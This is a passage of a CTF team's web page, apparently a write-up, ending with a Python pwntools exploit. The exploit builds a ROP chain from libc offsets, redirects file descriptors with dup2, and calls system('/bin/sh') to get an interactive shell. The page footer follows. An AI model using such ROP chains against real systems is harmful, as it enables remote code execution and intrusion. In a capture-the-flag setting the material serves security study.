<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> gadget_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">my_fd</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> gadget2_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dup2_offset</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> gadget_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">my_fd</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> gadget2_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> dup2_offset</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> gadget_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> binsh_offset</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">read_ref </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> read_offset </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> system_offset</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
&copy; 2025 Tower of Hanoi. All rights reserved.
<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://twitter.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Haoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-sz7xmlte> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-sz7xmlte></path> </svg> </a> </div> </footer>  </body></html>